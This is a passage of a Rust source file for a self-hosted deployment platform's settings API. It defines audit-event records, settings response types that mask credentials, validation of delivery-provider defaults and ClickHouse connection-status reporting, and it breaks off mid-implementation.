// SPDX-FileCopyrightText: 2024-2026 Temps Contributors
// SPDX-License-Identifier: MIT OR Apache-2.0

use crate::disk_status::DiskSpaceCheckResult;
use crate::service::preserve_provider_credential_proof;
use crate::{ConfigService, EffectiveTelemetryPolicies, TrustedPrivateNetworksIntent};
use axum::{
    extract::{Extension, State},
    http::{header, StatusCode},
    response::IntoResponse,
    routing::{delete, get, post, put},
    Json, Router,
};
use rand::RngExt;
use serde::{Deserialize, Serialize};
use sha2::Digest;
use std::sync::Arc;
use temps_auth::{permission_guard, RequireAuth};
use temps_core::error_builder::ErrorBuilder;
use temps_core::{
    problemdetails::Problem, AiChatLimitsSettings, AiConfigSettings, AiWorkspaceFileLimitsSettings,
    AppSettings, AuditContext, AuditLogger, AuditOperation, BuildLimitsSettings,
    ClickHouseCompression, CloudSettings, ClusterDnsSettings, ContainerLogSettings,
    DiskSpaceAlertSettings, ImageRetentionSettings, LetsEncryptSettings, MetricsStoreKind,
    MonitoringSettings, ObservabilityCompressionSettings, ObservabilityRetentionSettings,
    OnDemandTlsSettings, PublicHostnameStrategy, RateLimitSettings, RequestMetadata,
    RequestTimeoutSettings, ScreenshotSettings, SecurityHeadersSettings,
    MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR, MIN_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR,
};
use tracing::{error, info, warn};
use utoipa::{OpenApi, ToSchema};

pub struct SettingsState {
    pub config_service: Arc<ConfigService>,
    pub encryption_service: Arc<temps_core::EncryptionService>,
    pub audit_service: Arc<dyn AuditLogger>,
    pub sensitive_action_authorizer: Arc<dyn temps_core::SensitiveActionAuthorizer>,
    pub route_table_refresher: Option<Arc<dyn temps_core::route_table::RouteTableRefresher>>,
    /// Node enrollment token minting/listing/revocation (ADR-020 WS-1.1).
    pub enrollment_token_service: Arc<crate::enrollment_tokens::EnrollmentTokenService>,
    /// Result slot of the background release-update notifier (`temps serve`
    /// writes it). `None` in host processes that don't run the notifier
    /// (e.g. the standalone proxy's plugin context) — the update-status
    /// endpoint then reports "no update known".
    pub update_status: Option<Arc<temps_core::UpdateStatusSlot>>,
    /// Applies a release and restarts the server. `None` in hosts that cannot
    /// meaningfully restart themselves (e.g. the standalone proxy) — the
    /// update endpoints then report the feature as unsupported here rather
    /// than pretending it is merely misconfigured.
    pub self_updater: Option<Arc<dyn temps_core::SelfUpdater>>,
    /// Last result of the background ClickHouse preflight probe. `None` when
    /// ClickHouse is not configured on this instance.
    pub clickhouse_health: Option<Arc<temps_clickhouse::ClickHouseHealth>>,
}

#[derive(Debug, Clone, serde::Serialize)]
struct SettingsUpdatedAudit {
    context: AuditContext,
}

#[derive(Debug, Clone, serde::Serialize)]
struct ClusterCaRotatedAudit {
    context: AuditContext,
    previous_fingerprint: String,
    new_fingerprint: String,
    revoked_enrollment_tokens: u64,
}

impl AuditOperation for ClusterCaRotatedAudit {
    fn operation_type(&self) -> String {
        "CLUSTER_CA_ROTATED".to_string()
    }
    fn user_id(&self) -> Option<i32> {
        Some(self.context.user_id)
    }
    fn ip_address(&self) -> Option<String> {
        self.context.ip_address.clone()
    }
    fn user_agent(&self) -> &str {
        &self.context.user_agent
    }
    fn serialize(&self) -> anyhow::Result<String> {
        serde_json::to_string(self)
            .map_err(|error| anyhow::anyhow!("Failed to serialize audit operation {error}"))
    }
}

impl AuditOperation for SettingsUpdatedAudit {
    fn operation_type(&self) -> String {
        "SETTINGS_UPDATED".to_string()
    }
    fn user_id(&self) -> Option<i32> {
        Some(self.context.user_id)
    }
    fn ip_address(&self) -> Option<String> {
        self.context.ip_address.clone()
    }
    fn user_agent(&self) -> &str {
        &self.context.user_agent
    }
    fn serialize(&self) -> anyhow::Result<String> {
        serde_json::to_string(self)
            .map_err(|e| anyhow::anyhow!("Failed to serialize audit operation {}", e))
    }
}

/// The two ADR-042 §6.3 bulk-activation guard settings, resolved to the values
/// that would actually be **in effect**.
///
/// Effective rather than raw, for both of the jobs this type has. The
/// permission bar must compare like with like — `None` and `Some(5.0)` are the
/// same guard, and treating a client that omits the field as "widening from
/// nothing" would refuse ordinary saves. And the audit record has to name the
/// number that was really in force, because the point of writing it down is that
/// somebody months later can say what this instance's spend guard was on a given
/// day without also having to know which build's defaults applied.
#[derive(Debug, Clone, Copy, PartialEq)]
struct BulkActivationGuards {
    anomaly_factor: f32,
    rate_limit_spans_per_sec: Option<u32>,
}

impl From<&CloudSettings> for BulkActivationGuards {
    fn from(cloud: &CloudSettings) -> Self {
        Self {
            anomaly_factor: cloud.effective_bulk_anomaly_factor(),
            rate_limit_spans_per_sec: cloud.effective_bulk_rate_limit_spans_per_sec(),
        }
    }
}

/// `CLOUD_TELEMETRY_BULK_GUARD_UPDATED` — a change to one of ADR-042 §6.3's two
/// bulk-activation guard settings, carrying the values on both sides.
///
/// A separate event from `SETTINGS_UPDATED`, which records only who saved and
/// from where. That is enough for a presentation setting and not nearly enough
/// for these two: widening the anomaly factor from 5× to 50× raises the ceiling
/// on what a purchase-triggered activation may spend without any human
/// confirming it, and under one undifferentiated `SETTINGS_UPDATED` row it is
/// indistinguishable from somebody changing the instance's display name. An
/// audit trail that cannot answer "when did this instance's spend guard change,
/// and to what" is not an audit trail for a money guard.
#[derive(Debug, Clone, serde::Serialize)]
struct CloudTelemetryBulkGuardUpdatedAudit {
    context: AuditContext,
    previous_anomaly_factor: f32,
    new_anomaly_factor: f32,
    previous_rate_limit_spans_per_sec: Option<u32>,
    new_rate_limit_spans_per_sec: Option<u32>,
    /// Whether this change *loosened* the money guard — i.e. raised the anomaly
    /// factor. Recorded as its own field so the one direction that matters is
    /// greppable without a reader having to compare two floats themselves.
    widened_anomaly_factor: bool,
}

impl AuditOperation for CloudTelemetryBulkGuardUpdatedAudit {
    fn operation_type(&self) -> String {
        "CLOUD_TELEMETRY_BULK_GUARD_UPDATED".to_string()
    }
    fn user_id(&self) -> Option<i32> {
        Some(self.context.user_id)
    }
    fn ip_address(&self) -> Option<String> {
        self.context.ip_address.clone()
    }
    fn user_agent(&self) -> &str {
        &self.context.user_agent
    }
    fn serialize(&self) -> anyhow::Result<String> {
        serde_json::to_string(self)
            .map_err(|e| anyhow::anyhow!("Failed to serialize audit operation {}", e))
    }
}

/// `PUBLIC_INGRESS_URL_UPDATED` — a change to the base URL handed to third
/// parties that call back into Temps (ADR-051).
///
/// A separate event from `SETTINGS_UPDATED` because it redirects where every
/// provider webhook, tracking link and DSN points: an audit trail has to be
/// able to answer "when did callbacks start going to this host, and who moved
/// them" without diffing two settings documents.
#[derive(Debug, Clone, serde::Serialize)]
struct PublicIngressUrlUpdatedAudit {
    context: AuditContext,
    previous_url: Option<String>,
    new_url: Option<String>,
}

impl AuditOperation for PublicIngressUrlUpdatedAudit {
    fn operation_type(&self) -> String {
        "PUBLIC_INGRESS_URL_UPDATED".to_string()
    }
    fn user_id(&self) -> Option<i32> {
        Some(self.context.user_id)
    }
    fn ip_address(&self) -> Option<String> {
        self.context.ip_address.clone()
    }
    fn user_agent(&self) -> &str {
        &self.context.user_agent
    }
    fn serialize(&self) -> anyhow::Result<String> {
        serde_json::to_string(self)
            .map_err(|e| anyhow::anyhow!("Failed to serialize audit operation {}", e))
    }
}

/// `FORWARDED_IP_TRUST_UPDATED` — a change to whether Temps trusts
/// `X-Forwarded-For`/`X-Real-IP` from a loopback reverse proxy.
///
/// A separate event from `SETTINGS_UPDATED`, for the same reason as the bulk
/// activation guard above: this toggle decides which IP address feeds
/// analytics, proxy logs, and IP-based access-control decisions, so it must
/// be distinguishable in the audit trail from an unrelated settings save.
#[derive(Debug, Clone, serde::Serialize)]
struct ForwardedIpTrustUpdatedAudit {
    context: AuditContext,
    previous_enabled: bool,
    new_enabled: bool,
}

impl AuditOperation for ForwardedIpTrustUpdatedAudit {
    fn operation_type(&self) -> String {
        "FORWARDED_IP_TRUST_UPDATED".to_string()
    }
    fn user_id(&self) -> Option<i32> {
        Some(self.context.user_id)
    }
    fn ip_address(&self) -> Option<String> {
        self.context.ip_address.clone()
    }
    fn user_agent(&self) -> &str {
        &self.context.user_agent
    }
    fn serialize(&self) -> anyhow::Result<String> {
        serde_json::to_string(self)
            .map_err(|e| anyhow::anyhow!("Failed to serialize audit operation {}", e))
    }
}

/// `CLICKHOUSE_COMPRESSION_UPDATED` — the wire compression Temps uses to talk
/// to ClickHouse changed.
///
/// A separate event from `SETTINGS_UPDATED` because the wrong mode makes every
/// ClickHouse-backed feature (analytics, traces, proxy logs, metrics) return
/// nothing once the process restarts, and the trail must say who chose it and
/// what it replaced.
#[derive(Debug, Clone, serde::Serialize)]
struct ClickHouseCompressionUpdatedAudit {
    context: AuditContext,
    previous_compression: ClickHouseCompression,
    new_compression: ClickHouseCompression,
}

impl AuditOperation for ClickHouseCompressionUpdatedAudit {
    fn operation_type(&self) -> String {
        "CLICKHOUSE_COMPRESSION_UPDATED".to_string()
    }
    fn user_id(&self) -> Option<i32> {
        Some(self.context.user_id)
    }
    fn ip_address(&self) -> Option<String> {
        self.context.ip_address.clone()
    }
    fn user_agent(&self) -> &str {
        &self.context.user_agent
    }
    fn serialize(&self) -> anyhow::Result<String> {
        serde_json::to_string(self)
            .map_err(|e| anyhow::anyhow!("Failed to serialize audit operation {}", e))
    }
}

/// `TRUSTED_PRIVATE_NETWORKS_UPDATED` — the private networks user-configured
/// outbound requests may reach changed.
///
/// A separate event from `SETTINGS_UPDATED` because this list widens the SSRF
/// guard: every project member who can create a webhook, uptime check, or AI
/// provider can reach addresses inside it. Both sides are recorded so the
/// audit trail answers "who opened this network, and when".
#[derive(Debug, Clone, serde::Serialize)]
struct TrustedPrivateNetworksUpdatedAudit {
    context: AuditContext,
    previous_networks: Vec<String>,
    new_networks: Vec<String>,
}

impl AuditOperation for TrustedPrivateNetworksUpdatedAudit {
    fn operation_type(&self) -> String {
        "TRUSTED_PRIVATE_NETWORKS_UPDATED".to_string()
    }
    fn user_id(&self) -> Option<i32> {
        Some(self.context.user_id)
    }
    fn ip_address(&self) -> Option<String> {
        self.context.ip_address.clone()
    }
    fn user_agent(&self) -> &str {
        &self.context.user_agent
    }
    fn serialize(&self) -> anyhow::Result<String> {
        serde_json::to_string(self)
            .map_err(|e| anyhow::anyhow!("Failed to serialize audit operation {}", e))
    }
}

/// `GEO_LICENSE_KEY_UPDATED` — the MaxMind license key was stored, rotated,
/// or removed.
///
/// A separate event from `SETTINGS_UPDATED` for the same reason as the two
/// above: this is a credential write. Storing or clearing it changes which
/// third party this instance authenticates to and downloads geolocation data
/// from, and under one undifferentiated `SETTINGS_UPDATED` row "somebody
/// replaced the MaxMind credential" is indistinguishable from "somebody
/// changed the refresh interval".
///
/// Booleans only. Neither the key nor its ciphertext is recorded — an audit
/// trail is a long-lived, widely-readable store, and "a key was set" is the
/// entire security-relevant fact.
#[derive(Debug, Clone, serde::Serialize)]
struct GeoLicenseKeyUpdatedAudit {
    context: AuditContext,
    /// A new key was submitted and encrypted (first save or a rotation).
    key_set: bool,
    /// The stored key was removed, reverting downloads to the bundled copy.
    key_cleared: bool,
}

impl AuditOperation for GeoLicenseKeyUpdatedAudit {
    fn operation_type(&self) -> String {
        "GEO_LICENSE_KEY_UPDATED".to_string()
    }
    fn user_id(&self) -> Option<i32> {
        Some(self.context.user_id)
    }
    fn ip_address(&self) -> Option<String> {
        self.context.ip_address.clone()
    }
    fn user_agent(&self) -> &str {
        &self.context.user_agent
    }
    fn serialize(&self) -> anyhow::Result<String> {
        serde_json::to_string(self)
            .map_err(|e| anyhow::anyhow!("Failed to serialize audit operation {}", e))
    }
}

/// Audit record for a console-triggered platform update. Written before the
/// process exits, so the trail survives the restart it causes.
#[derive(Debug, Clone, serde::Serialize)]
struct PlatformUpdateStartedAudit {
    context: AuditContext,
    /// Version the server was running when the update was requested.
    from_version: String,
    /// Explicitly pinned target, or `None` for "newest on this channel".
    target_version: Option<String>,
}

impl AuditOperation for PlatformUpdateStartedAudit {
    fn operation_type(&self) -> String {
        "PLATFORM_UPDATE_STARTED".to_string()
    }
    fn user_id(&self) -> Option<i32> {
        Some(self.context.user_id)
    }
    fn ip_address(&self) -> Option<String> {
        self.context.ip_address.clone()
    }
    fn user_agent(&self) -> &str {
        &self.context.user_agent
    }
    fn serialize(&self) -> anyhow::Result<String> {
        serde_json::to_string(self)
            .map_err(|e| anyhow::anyhow!("Failed to serialize audit operation {}", e))
    }
}

/// Response for successful settings update
#[derive(Debug, Serialize, Deserialize, ToSchema)]
pub struct SettingsUpdateResponse {
    pub message: String,
}

/// Response returned when a join token is generated (plaintext shown once)
#[derive(Debug, Serialize, Deserialize, ToSchema)]
pub struct GenerateJoinTokenResponse {
    /// The plaintext join token — shown only once, save it now
    pub token: String,
    pub message: String,
}

/// Response for join token status check
#[derive(Debug, Serialize, Deserialize, ToSchema)]
pub struct JoinTokenStatusResponse {
    /// Whether a join token has been configured
    pub has_token: bool,
}

/// Safe response for application settings that masks sensitive fields
#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
pub struct AppSettingsResponse {
    /// Consent for verified external-plugin installation count reporting.
    pub plugin_installation_reporting_enabled: bool,
    // Core settings
    pub external_url: Option<String>,
    pub internal_url: Option<String>,
    /// Base URL handed to third parties that call back into Temps (ADR-051).
    /// `None` means callbacks use `external_url`; see
    /// `GET /settings/public-ingress` for the effective value.
    pub public_ingress_url: Option<String>,
    pub preview_domain: String,
    /// Public edge target that synced DNS records point at (IP → A/AAAA, else CNAME).
    pub edge_target: Option<String>,
    /// Applies Cloudflare delivery only to future projects.
    pub cloudflare_new_projects: bool,
    pub bunny_new_projects: bool,
    /// Whether plain-HTTP requests to the console host are redirected to HTTPS.
    /// `None` inherits the per-host certificate heuristic; `Some(b)` is an
    /// explicit operator override. No sensitive content.
    pub console_force_https: Option<bool>,
    /// Port the main Pingora proxy listens on (parsed from `--address`), the
    /// same value `ConfigService::proxy_port()` feeds into
    /// `compute_deployment_url`/`compute_environment_url` when `external_url`
    /// is unset. The console uses this to preview a project's real
    /// `{slug}-{env_slug}.{preview_domain}:{port}` URL before it's deployed.
    pub proxy_port: u16,

    /// Managed control-plane destination and explicit export consent flags.
    pub cloud: CloudSettings,

    // Screenshot settings
    pub screenshots: ScreenshotSettings,

    // TLS/ACME settings
    pub letsencrypt: LetsEncryptSettings,

    // DNS provider settings with masked API key
    pub dns_provider: DnsProviderSettingsMasked,

    // Security settings
    pub security_headers: SecurityHeadersSettings,
    pub rate_limiting: RateLimitSettings,
    /// Database-backed opt-in; this is the sole control surface for every
    /// proxy process, including a standalone `temps proxy`.
    pub trust_loopback_forwarded_ip: bool,

    // Docker registry settings with masked password
    pub docker_registry: DockerRegistrySettingsMasked,

    /// Prefix applied to implicit Docker Hub base images in generated
    /// Dockerfiles (e.g. autopack's `FROM node:22-slim`). No sensitive
    /// content, passed through as-is. `None`/empty disables rewriting.
    pub registry_mirror_prefix: Option<String>,

    // Monitoring settings
    pub disk_space_alert: DiskSpaceAlertSettings,

    // Docker container log rotation settings
    pub container_logs: ContainerLogSettings,

    // Agent sandbox settings with masked per-provider credentials
    pub agent_sandbox: AgentSandboxSettingsMasked,

    // AI config (config repo for skills/MCP/etc)
    pub ai_config: AiConfigSettings,

    // Workspace preview gateway (shared_secret masked)
    pub preview_gateway: PreviewGatewaySettingsMasked,

    // Multi-node cluster settings (join_token_hash elided)
    pub multi_node: MultiNodeSettingsMasked,

    // Metrics monitoring settings (clickhouse_url masked)
    pub monitoring: MonitoringSettingsMasked,

    /// Number of enabled, running services the MetricsScraper currently
    /// includes. Used for the lightweight storage estimate in the UI.
    pub monitored_services_count: Option<u64>,

    /// TimescaleDB compression delays for immutable proxy logs and OTel spans.
    pub observability_compression: ObservabilityCompressionSettings,

    /// Retention windows for raw proxy logs and OpenTelemetry data.
    pub observability_retention: ObservabilityRetentionSettings,

    /// Retention of analytics events and of the visitors and client IP
    /// addresses attached to them.
    pub analytics_retention: temps_core::AnalyticsRetentionSettings,

    /// ClickHouse wire compression: the stored choice, the mode the running
    /// process actually uses, and what the startup probe found. Always
    /// present; `configured: false` explains what is missing instead of the
    /// section disappearing.
    pub clickhouse: ClickHouseSettingsResponse,

    /// Geolocation refresh policy and freshness, with the MaxMind license key
    /// reported only as a boolean.
    pub geo: GeoSettingsMasked,

    /// The storage backend the runtime is **actually** using for metrics,
    /// after reconciling the `monitoring.store` toggle with the server's
    /// `TEMPS_CLICKHOUSE_*` configuration. When `monitoring.store` is
    /// `click_house` but those env vars are not fully set, the runtime falls
    /// back to TimescaleDB — in that case this reports `timescale_db` even
    /// though `monitoring.store` says `click_house`. The UI shows this as the
    /// effective backend and warns when it diverges from the configured store.
    pub effective_metrics_store: MetricsStoreKind,

    /// Storage backend actually used for proxy logs, OTel spans, and OTel
    /// metrics. OTel logs remain TimescaleDB-backed. Unlike resource metrics,
    /// these domains switch to ClickHouse whenever the server-level ClickHouse
    /// connection is configured; they do not use the monitoring store toggle.
    pub effective_observability_store: MetricsStoreKind,

    // Outbound TLS verification toggle
    pub insecure_tls: bool,

    /// Private networks (normalized CIDRs) that user-configured outbound
    /// requests may reach despite the SSRF guard. Empty means none.
    pub trusted_private_networks: Vec<String>,

    /// Whether `temps setup` has been run at least once. The web onboarding
    /// wizard checks this field on load and skips itself when true.
    pub setup_complete: bool,

    /// When enabled, Admin-role accounts without MFA enrolled are rejected
    /// at password login (bherila/temps#32). SSO/OIDC logins are unaffected.
    pub require_mfa_for_admins: bool,

    /// On-demand (lazy) HTTP-01 TLS issuance (ADR-018). No sensitive content,
    /// passed through as-is so operators can see whether on-demand
    /// certificates are enabled and for which zone.
    pub on_demand_tls: OnDemandTlsSettings,

    /// Cluster-DNS resolver settings (ADR-024, experimental beta). No masking
    /// needed — `enabled` is a plain bool with no sensitive content. Passed
    /// through as-is so the settings UI can read and toggle the flag.
    pub cluster_dns: ClusterDnsSettings,

    /// Build-time resource limits (control-plane only). No sensitive content,
    /// passed through as-is.
    pub build_limits: BuildLimitsSettings,

    /// Per-turn limits for the AI chat. No sensitive content.
    pub ai_chat_limits: AiChatLimitsSettings,
    /// Persistent AI workspace file transfer and preview limits.
    pub ai_workspace_file_limits: AiWorkspaceFileLimitsSettings,
    /// Upstream request/connection timeouts (hard ceiling + defaults) applied
    /// by the proxy to customer app traffic. No sensitive content.
    pub request_timeouts: RequestTimeoutSettings,
    /// Per-upstream concurrent-connection cap applied by the proxy to
    /// customer app traffic. No sensitive content. See issue #646.
    pub connection_limits: temps_core::ConnectionLimitSettings,
    /// Upper bounds a project/environment override may not exceed. No
    /// sensitive content — this is operator policy the settings UI edits
    /// directly. Unenforced by default.
    pub tenant_resource_ceilings: temps_core::TenantResourceCeilings,
    /// Whether admins may apply a release from the console. This is the
    /// database-backed toggle only — a server started with
    /// `--disable-self-update` refuses regardless of what this says, which
    /// `GET /settings/update` reports as the authoritative answer.
    pub self_update: temps_core::SelfUpdateSettings,
    /// Deployment-image retention policy. No sensitive content, passed through
    /// as-is so the settings UI can show and edit the system-wide default.
    pub image_retention: ImageRetentionSettings,
    /// MCP (Model Context Protocol) server toggle (ADR-039). No sensitive
    /// content — passed through as-is so the settings UI can show and edit it.
    pub mcp_server: temps_core::McpServerSettings,
}

fn conflicting_delivery_defaults(settings: &AppSettings) -> bool {
    settings.cloudflare_new_projects && settings.bunny_new_projects
}

/// Delivery providers this save switches on as the default for new projects.
///
/// Only a transition from off to on is checked for availability: a default
/// that was valid when saved and whose provider was disconnected later must
/// not make every unrelated settings save fail. Project creation degrades such
/// a stale default to "no delivery" instead.
fn newly_enabled_delivery_defaults(
    stored: &AppSettings,
    submitted: &AppSettings,
) -> Vec<&'static str> {
    let mut enabled = Vec::new();
    if submitted.cloudflare_new_projects && !stored.cloudflare_new_projects {
        enabled.push("cloudflare");
    }
    if submitted.bunny_new_projects && !stored.bunny_new_projects {
        enabled.push("bunny");
    }
    enabled
}

/// Refuse a delivery default that project creation could not honour: both
/// providers at once, or a provider with no usable DNS provider/profile.
async fn validate_delivery_defaults(
    config_service: &ConfigService,
    stored: &AppSettings,
    submitted: &AppSettings,
) -> Result<(), Problem> {
    if conflicting_delivery_defaults(submitted) {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .title("Conflicting Delivery Defaults")
            .detail("Choose Cloudflare or Bunny for new projects; both cannot be enabled globally at once.")
            .build());
    }
    for provider in newly_enabled_delivery_defaults(stored, submitted) {
        let reason = config_service
            .delivery_default_unavailable_reason(provider)
            .await
            .map_err(|error| {
                error!(
                    "Could not check whether delivery provider {} is usable before enabling it as the new-project default: {}",
                    provider, error
                );
                ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
                    .title("Settings Save Aborted")
                    .detail(format!(
                        "Could not check whether {provider} delivery is configured before enabling it for new projects; nothing was saved: {error}"
                    ))
                    .build()
            })?;
        if let Some(reason) = reason {
            return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
                .title("Delivery Provider Not Configured")
                .detail(format!("{reason}. Nothing was saved."))
                .value("provider", provider)
                .build());
        }
    }
    Ok(())
}

/// Geolocation settings with the MaxMind license key masked.
///
/// The stored value is AES-256-GCM ciphertext, and neither it nor the
/// plaintext is ever returned: the UI only needs to know whether a key is
/// saved, so it can render the "leave blank to keep current" affordance the
/// email-provider credentials use. The refresh metadata below is reported
/// read-only — it is written by the refresh job, not by a settings save.
#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
pub struct GeoSettingsMasked {
    /// `null` means the effective default (24 hours).
    pub refresh_interval_hours: Option<u32>,
    /// `null` means the effective default (30 days).
    pub stale_lookup_days: Option<u32>,
    /// Refresh cadence actually applied, with defaults and bounds resolved.
    pub effective_refresh_interval_hours: u32,
    /// Staleness window actually applied, with defaults and bounds resolved.
    pub effective_stale_lookup_days: u32,
    /// True when a MaxMind license key is stored. The key is never returned.
    pub maxmind_license_key_saved: bool,
    /// When new database bytes were last installed (ISO 8601, UTC).
    pub last_refreshed_at: Option<String>,
    /// `maxmind_official` or `bundled_github`.
    pub source: Option<String>,
    /// When a refresh was last attempted, successful or not (ISO 8601, UTC).
    pub last_check_at: Option<String>,
    /// `ok` or `error` for the most recent refresh attempt.
    pub last_check_status: Option<String>,
    /// Redacted reason the last refresh failed. Never contains the key.
    pub last_error: Option<String>,
}

impl From<temps_core::GeoSettings> for GeoSettingsMasked {
    fn from(geo: temps_core::GeoSettings) -> Self {
        Self {
            refresh_interval_hours: geo.refresh_interval_hours,
            stale_lookup_days: geo.stale_lookup_days,
            effective_refresh_interval_hours: geo.effective_refresh_interval_hours(),
            effective_stale_lookup_days: geo.effective_stale_lookup_days(),
            maxmind_license_key_saved: geo.license_key_configured(),
            last_refreshed_at: geo.last_refreshed_at.map(iso8601),
            source: geo.source,
            last_check_at: geo.last_check_at.map(iso8601),
            last_check_status: geo.last_check_status,
            last_error: geo.last_error,
        }
    }
}

fn iso8601(value: chrono::DateTime<chrono::Utc>) -> String {
    value.to_rfc3339_opts(chrono::SecondsFormat::Secs, true)
}

/// Where the connection to the instance's ClickHouse server stands.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, ToSchema)]
#[serde(rename_all = "snake_case")]
pub enum ClickHouseConnectionState {
    /// `TEMPS_CLICKHOUSE_*` is not (fully) set; ClickHouse-backed features use
    /// TimescaleDB.
    NotConfigured,
    /// Configured, but no probe has finished yet (startup, or the probe task
    /// is not running in this process).
    NotChecked,
    /// The server answered and its response decoded.
    Reachable,
    /// The last probe failed. See `failure_kind` and `detail`.
    Failing,
}

/// Why the last ClickHouse probe failed.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, ToSchema)]
#[serde(rename_all = "snake_case")]
pub enum ClickHouseFailureKind {
    /// The server answered in a codec the client cannot decode. Waiting does
    /// not help: change the server's `network_compression_method` or set
    /// Temps' compression to `none`.
    Decode,
    /// Connection refused/reset, DNS failure or timeout.
    Unreachable,
    /// The server answered and rejected the request.
    Server,
    Other,
}

impl From<temps_clickhouse::FailureKind> for ClickHouseFailureKind {
    fn from(kind: temps_clickhouse::FailureKind) -> Self {
        match kind {
            temps_clickhouse::FailureKind::Decode => ClickHouseFailureKind::Decode,
            temps_clickhouse::FailureKind::Unreachable => ClickHouseFailureKind::Unreachable,
            temps_clickhouse::FailureKind::Server => ClickHouseFailureKind::Server,
            temps_clickhouse::FailureKind::Other => ClickHouseFailureKind::Other,
        }
    }
}

/// Result of the ClickHouse startup/background probe. Carries no credentials:
/// `host` is `host[:port]` only.
#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
pub struct ClickHouseConnectionStatus {
    pub state: ClickHouseConnectionState,
    /// `host[:port]` of the configured server.
    pub host: Option<String>,
    pub database: Option<String>,
    /// Server version from the last successful probe, e.g. `26.9.17`.
    pub server_version: Option<String>,
    /// Set when `state` is `failing`.
    pub failure_kind: Option<ClickHouseFailureKind>,
    /// Full operator-facing description of the failure.
    pub detail: Option<String>,
    /// For decode failures: the compression method byte seen on the wire,
    /// e.g. `zstd (0x90)`.
    pub observed_compression_method: Option<String>,
    /// What to do about the failure, when there is a known remedy.
    pub remedy: Option<String>,
    /// When the last probe finished (ISO 8601, `Z`).
    pub last_checked_at: Option<String>,
}

impl ClickHouseConnectionStatus {
    fn not_configured() -> Self {
        Self {
            state: ClickHouseConnectionState::NotConfigured,
            host: None,
            database: None,
            server_version: None,
            failure_kind: None,
            detail: None,
            observed_compression_method: None,
            remedy: None,
            last_checked_at: None,
        }
    }

    fn from_snapshot(snapshot: temps_clickhouse::HealthSnapshot) -> Self {
        use temps_clickhouse::ConnectionState;

        let mut status = Self {
            state: ClickHouseConnectionState::NotChecked,
            host: Some(snapshot.host),
            database: Some(snapshot.database),
            server_version: None,
            failure_kind: None,
            detail: None,
            observed_compression_method: None,
            remedy: None,
            last_checked_at: snapshot.last_checked_at.map(iso8601),
        };
        match snapshot.state {
            ConnectionState::NotChecked => {}
            ConnectionState::Reachable { server_version } => {
                status.state = ClickHouseConnectionState::Reachable;
                status.server_version = Some(server_version);
            }
            ConnectionState::Failing {
                kind,
                message,
                observed_method,
                remedy,
            } => {
                status.state = ClickHouseConnectionState::Failing;
                status.failure_kind = Some(kind.into());
                status.detail = Some(message);
                status.observed_compression_method = observed_method.map(|m| m.to_string());
                status.remedy = remedy.map(str::to_string);
            }
        }
        status
    }
}

/// ClickHouse wire compression and connection state, as the settings page
/// needs them. Not a credential holder: the connection string is never echoed.
#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
pub struct ClickHouseSettingsResponse {
    /// Whether the instance has a ClickHouse connection
    /// (`TEMPS_CLICKHOUSE_*`). When `false` the compression setting is stored
    /// but has nothing to apply to yet.
    pub configured: bool,
    /// Why ClickHouse is unavailable, when `configured` is `false`.
    pub reason: Option<String>,
    /// Console path where the operator manages this, when `configured` is
    /// `false` or the probe is failing.
    pub setup_path: Option<String>,
    /// The stored mode: what the next start will use.
    pub compression: ClickHouseCompression,
    /// The mode the running process built its ClickHouse clients with.
    /// `None` when ClickHouse is not configured.
    pub effective_compression: Option<ClickHouseCompression>,
    /// True when `compression` differs from `effective_compression`: the
    /// stored change takes effect on the next restart.
    pub restart_required: bool,
    /// The modes that can be chosen.
    pub available_compressions: Vec<ClickHouseCompression>,
    /// Result of the last connection probe.
    pub connection: ClickHouseConnectionStatus,
}

/// Console path of the settings page where ClickHouse is managed.
const CLICKHOUSE_SETTINGS_PATH: &str = "/settings/metrics-monitoring";

impl ClickHouseSettingsResponse {
    fn from_stored(compression: ClickHouseCompression) -> Self {
        Self {
            configured: false,
            reason: None,
            setup_path: None,
            compression,
            effective_compression: None,
            restart_required: false,
            available_compressions: ClickHouseCompression::ALL.to_vec(),
            connection: ClickHouseConnectionStatus::not_configured(),
        }
    }

    /// Fill in what the running process knows. `effective` and `health` are
    /// `None` when ClickHouse is not configured.
    fn with_runtime_state(
        mut self,
        configured: bool,
        effective: ClickHouseCompression,
        health: Option<temps_clickhouse::HealthSnapshot>,
    ) -> Self {
        self.configured = configured;
        if !configured {
            self.reason = Some(
                "ClickHouse is not configured on this instance. Set TEMPS_CLICKHOUSE_URL, \
                 TEMPS_CLICKHOUSE_USER and TEMPS_CLICKHOUSE_PASSWORD (TEMPS_CLICKHOUSE_DATABASE \
                 is optional) and restart Temps; until then analytics, traces, proxy logs and \
                 metrics use TimescaleDB. The compression mode below is stored and applied once \
                 ClickHouse is configured."
                    .to_string(),
            );
            self.setup_path = Some(CLICKHOUSE_SETTINGS_PATH.to_string());
            return self;
        }

        self.effective_compression = Some(effective);
        self.restart_required = self.compression != effective;
        self.connection = match health {
            Some(snapshot) => ClickHouseConnectionStatus::from_snapshot(snapshot),
            None => {
                let mut status = ClickHouseConnectionStatus::not_configured();
                status.state = ClickHouseConnectionState::NotChecked;
                status
            }
        };
        if self.connection.state == ClickHouseConnectionState::Failing {
            self.setup_path = Some(CLICKHOUSE_SETTINGS_PATH.to_string());
        }
        self
    }
}

/// Monitoring settings with the ClickHouse DSN masked.
///
/// `clickhouse_url` can embed credentials (`http://user:pass@host`), so it is
/// reported only as a boolean (`clickhouse_url_set`) rather than echoed back —
/// consistent with how the DNS API key and Docker registry password are masked.
#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
pub struct MonitoringSettingsMasked {
    pub enabled: bool,
    pub store: MetricsStoreKind,
    pub scrape_interval_secs: u64,
    pub retention_raw_days: u32,
    pub retention_hourly_days: u32,
    pub retention_daily_years: u32,
    /// True when a ClickHouse DSN is configured. The DSN itself is never
    /// returned over HTTP because it may contain credentials.
    pub clickhouse_url_set: bool,
}

impl From<temps_core::MonitoringSettings> for MonitoringSettingsMasked {
    fn from(m: temps_core::MonitoringSettings) -> Self {
